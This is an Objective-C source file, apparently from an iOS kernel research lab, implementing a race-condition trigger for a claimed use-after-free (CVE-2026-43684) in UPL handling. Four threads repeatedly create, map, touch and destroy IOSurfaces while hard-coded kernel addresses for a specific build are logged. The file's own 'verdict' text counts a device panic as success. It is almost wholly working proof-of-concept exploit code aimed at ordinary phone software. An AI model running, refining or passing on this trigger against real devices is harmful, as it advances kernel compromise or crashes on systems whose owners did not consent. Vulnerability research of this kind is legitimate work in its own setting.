//
//  P055IOSurfaceUPL.m
//  P007OpenOnly
//
//  Created by Kolby Kehler on 9/18/26.
//


//
//  P055IOSurfaceUPL.m
//  CVE-2026-43684: UPL UAF via IOSurface mapping
//  Target: vm_object_iopl_request 0xfffffff009f0377c (23F77)
//  Trigger: Race IOSurface creation/mapping vs destruction
//

#import "P055IOSurfaceUPL.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <pthread.h>
#import <stdlib.h>
#import <string.h>
#import <stdarg.h>

/* iOS SDK has no IOSurface/IOSurface.h — same dlsym pattern as P009 / CSRaceCalib. */
typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef mach_port_t (*IOSurfaceCreateMachPort_t)(IOSurfaceRef);
typedef mach_port_t (*IOSurfaceCreateMemoryObject_t)(IOSurfaceRef, uint32_t);

kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                          mach_vm_size_t size, mach_vm_offset_t mask, int flags,
                          mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
                          vm_inherit_t inheritance);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

static IOSurfaceCreate_t p055_iosCreate;
static IOSurfaceCreateMachPort_t p055_iosMachPort;
static IOSurfaceCreateMemoryObject_t p055_iosMemObj;

#define P055_BUILD @"p055-iosurface-upl-v1"

static int g_log_fd = -1;

static void p055_log(NSMutableString *buf, NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [buf appendString:out];
    if (g_log_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_log_fd, s, strlen(s));
            fcntl(g_log_fd, F_FULLFSYNC);
        }
    }
}

static void *p055_surface_thread(void *arg) {
    int *stop = (int *)arg;
    int count = 0;
    
    while (!*stop) {
        /* Create an IOSurface */
        NSMutableDictionary *props = [NSMutableDictionary dictionary];
        [props setObject:@(0x1000) forKey:@"IOSurfaceWidth"];
        [props setObject:@(1) forKey:@"IOSurfaceHeight"];
        [props setObject:@(4) forKey:@"IOSurfaceBytesPerElement"];
        [props setObject:@(0x4000) forKey:@"IOSurfaceBytesPerRow"];
        [props setObject:@(0x4000) forKey:@"IOSurfaceAllocSize"];
        
        IOSurfaceRef surface = p055_iosCreate ? p055_iosCreate((__bridge CFDictionaryRef)props) : NULL;
        if (surface) {
            /* Map it (triggers vm_object_iopl_request) */
            mach_port_t mem_obj = MACH_PORT_NULL;
            if (p055_iosMemObj)
                mem_obj = p055_iosMemObj(surface, 0);
            else if (p055_iosMachPort)
                mem_obj = p055_iosMachPort(surface);
            if (mem_obj != MACH_PORT_NULL) {
                mach_vm_address_t addr = 0;
                mach_vm_size_t size = 0x4000;
                kern_return_t kr = mach_vm_map(mach_task_self(), &addr, size, 0,
                                              VM_FLAGS_ANYWHERE, mem_obj, 0, FALSE,
                                              VM_PROT_READ | VM_PROT_WRITE,
                                              VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
                if (kr == KERN_SUCCESS) {
                    /* Touch the memory to force UPL resolution */
                    *(volatile uint8_t *)addr = 0x41;
                    mach_vm_deallocate(mach_task_self(), addr, size);
                }
                mach_port_deallocate(mach_task_self(), mem_obj);
            }
            /* Destroy the surface (frees UPL) */
            CFRelease(surface);
            count++;
        }
    }
    
    p055_log(nil, @"  [thread] created/mapped/destroyed %d surfaces", count);
    return NULL;
}

@implementation P055IOSurfaceUPL

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *logPath = [docs stringByAppendingPathComponent:@"p055_iosurface_upl_log.txt"];
    g_log_fd = open([logPath UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
    
    p055_log(log, @"=== p055 session BUILD %@ ===", P055_BUILD);
    p055_log(log, @"CVE-2026-43684 MAP: IOMemoryDescriptor_makeMapping 0xfffffff00a512314");
    p055_log(log, @"  (upl_transpose; iopl 0xfffffff009f0377c is callee. 26.7 added upl_validation)");
    p055_log(log, @"AllocSize was 0 (create often fails silently) — now 0x4000 to actually map.");
    p055_log(log, @"");

    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
    p055_iosCreate = iosH ? (IOSurfaceCreate_t)dlsym(iosH, "IOSurfaceCreate") : NULL;
    p055_iosMemObj = iosH ? (IOSurfaceCreateMemoryObject_t)dlsym(iosH, "IOSurfaceCreateMemoryObject") : NULL;
    p055_iosMachPort = iosH ? (IOSurfaceCreateMachPort_t)dlsym(iosH, "IOSurfaceCreateMachPort") : NULL;
    if (!p055_iosCreate) {
        p055_log(log, @"[-] IOSurfaceCreate dlsym failed");
        if (g_log_fd >= 0) { fcntl(g_log_fd, F_FULLFSYNC); close(g_log_fd); g_log_fd = -1; }
        return log;
    }
    
    p055_log(log, @"[*] Starting 4 threads × IOSurface create/map/destroy loop (30s)...");
    
    volatile int stop = 0;
    pthread_t tids[4];
    for (int i = 0; i < 4; i++) {
        pthread_create(&tids[i], NULL, p055_surface_thread, (void *)&stop);
    }
    
    for (int t = 5; t <= 30; t += 5) {
        sleep(5);
        p055_log(log, @"[race] t=%ds", t);
    }
    
    stop = 1;
    for (int i = 0; i < 4; i++) pthread_join(tids[i], NULL);
    
    p055_log(log, @"");
    p055_log(log, @"=== VERDICT ===");
    p055_log(log, @"If device panicked: check for vm_object_iopl_request or upl in panic log");
    p055_log(log, @"If no panic: need different surface size or mapping flags");
    
    if (g_log_fd >= 0) {
        fcntl(g_log_fd, F_FULLFSYNC);
        close(g_log_fd);
        g_log_fd = -1;
    }
    
    return log;
}

@end
